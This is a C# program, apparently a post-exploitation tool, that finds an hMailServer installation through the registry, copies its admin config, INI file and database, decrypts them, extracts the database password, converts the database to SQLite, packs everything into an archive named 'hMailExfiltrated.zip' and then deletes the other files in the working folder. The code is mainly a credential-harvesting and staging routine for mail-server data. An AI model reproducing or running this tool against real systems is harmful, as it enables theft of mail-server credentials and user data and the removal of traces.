// File: Program.cs
using System;
using System.IO;
using System.IO.Compression;
using System.Collections.Generic;
using System.Reflection;
using HMailTools.Registry;
using HMailTools.Utilities;

namespace HMailTools
{
    class Program
    {
        static void Main(string[] args)
        {
            bool configOk   = false;
            bool iniOk      = false;
            bool dbOk       = false;

            string cfgDec   = null;
            string iniDec   = null;
            string sqliteDb = null;

            // 1) Grab file paths from registry
            string installDir = RegistryPaths.GetInstallLocation();
            if (installDir == null)
            {
                Console.Error.WriteLine("hMailServer not installed.");
                return;
            }
            var paths = RegistryPaths.GetPaths(installDir);

            // 2) Copy files into cwd
            var localCopies = FileCopyHelper
                .CopyRegistryFilesToWorkingDirectory(paths, Environment.CurrentDirectory);

            // 3) Process config first
            if (localCopies.TryGetValue("hMailAdmin.exe.config", out var cfgSrc))
            {
                try
                {
                    Console.WriteLine("[Step] Processing config...");
                    cfgDec = Path.Combine(Environment.CurrentDirectory, "hMailAdmin.decrypted.config");
                    File.Copy(cfgSrc, cfgDec, overwrite: true);
                    ConfigProcessor.ProcessConfig(cfgDec);
                    configOk = true;
                    Console.WriteLine("[Success] Config processed: " + cfgDec);
                }
                catch (Exception ex)
                {
                    Console.Error.WriteLine($"[Error] Config processing failed: {ex.Message}");
                }
            }

            // 4) Process INI next
            if (localCopies.TryGetValue("hMailServer.ini", out var iniSrc))
            {
                try
                {
                    Console.WriteLine("[Step] Processing INI...");
                    iniDec = Path.Combine(Environment.CurrentDirectory, "hMailServer.decrypted.ini");
                    File.Copy(iniSrc, iniDec, overwrite: true);
                    IniProcessor.ProcessIni(iniDec);
                    iniOk = true;
                    Console.WriteLine("[Success] INI processed: " + iniDec);
                }
                catch (Exception ex)
                {
                    Console.Error.WriteLine($"[Error] INI processing failed: {ex.Message}");
                }
            }

            // 5) Convert SDF → SQLite DB last
            if (localCopies.TryGetValue("hMailServer.sdf", out var sdfSrc) && iniOk)
            {
                try
                {
                    Console.WriteLine("[Step] Converting SDF to SQLite...");
                    string dbPassword = IniProcessor.GetDatabasePassword(iniDec);
                    sqliteDb = Path.Combine(Environment.CurrentDirectory, "hMailServer.db");
                    SdfToSqliteConverter.ConvertLocalSdfToSqlite(sdfSrc, sqliteDb, dbPassword);
                    dbOk = true;
                    Console.WriteLine("[Success] DB created: " + sqliteDb);
                }
                catch (Exception ex)
                {
                    Console.Error.WriteLine($"[Error] DB conversion failed: {ex.Message}");
                }
            }

            // 6) Release SQLite locks before zipping
            if (dbOk && sqliteDb != null)
            {
                Microsoft.Data.Sqlite.SqliteConnection.ClearAllPools();
                GC.Collect();
                GC.WaitForPendingFinalizers();
            }

            // Prepare common names for zip & cleanup
            string cwd           = Environment.CurrentDirectory;
            string exeName       = Path.GetFileName(Assembly.GetEntryAssembly().Location);
            string exportDirName = "ExportSql";
            string exportZipName = "ExportSql.zip";
            string exfilZipName  = "hMailExfiltrated.zip";
            string exfilZipPath  = Path.Combine(cwd, exfilZipName);

            // 7) Zip originals + decrypted outputs
            if (File.Exists(exfilZipPath)) File.Delete(exfilZipPath);
            using (var zip = ZipFile.Open(exfilZipPath, ZipArchiveMode.Create))
            {
                // Originals
                if (localCopies.TryGetValue("hMailAdmin.exe.config", out var origCfg))
                    zip.CreateEntryFromFile(origCfg, Path.GetFileName(origCfg));
                if (localCopies.TryGetValue("hMailServer.ini", out var origIni))
                    zip.CreateEntryFromFile(origIni, Path.GetFileName(origIni));
                if (localCopies.TryGetValue("hMailServer.sdf", out var origSdf))
                    zip.CreateEntryFromFile(origSdf, Path.GetFileName(origSdf));

                // Decrypted/converted
                if (configOk && cfgDec   != null) zip.CreateEntryFromFile(cfgDec,   Path.GetFileName(cfgDec));
                if (iniOk    && iniDec   != null) zip.CreateEntryFromFile(iniDec,   Path.GetFileName(iniDec));
                if (dbOk     && sqliteDb != null) zip.CreateEntryFromFile(sqliteDb, Path.GetFileName(sqliteDb));
            }
            Console.WriteLine($"Zipped originals + outputs: {exfilZipPath}");

            // 8) Cleanup: delete everything except EXE, ExportSql folder, ExportSql.zip, and the exfil ZIP
            var keepNames = new HashSet<string>(StringComparer.OrdinalIgnoreCase)
            {
                exeName,
                exportDirName,
                exportZipName,
                exfilZipName
            };

            foreach (var file in Directory.GetFiles(cwd))
            {
                var name = Path.GetFileName(file);
                if (!keepNames.Contains(name))
                {
                    try { File.Delete(file); Console.WriteLine($"[Cleanup] Deleted file: {name}"); }
                    catch { /* ignore */ }
                }
            }

            foreach (var dir in Directory.GetDirectories(cwd))
            {
                var name = Path.GetFileName(dir);
                if (!keepNames.Contains(name))
                {
                    try { Directory.Delete(dir, recursive: true); Console.WriteLine($"[Cleanup] Deleted directory: {name}"); }
                    catch { /* ignore */ }
                }
            }

            Console.WriteLine("Cleanup complete.");
        }
    }
}
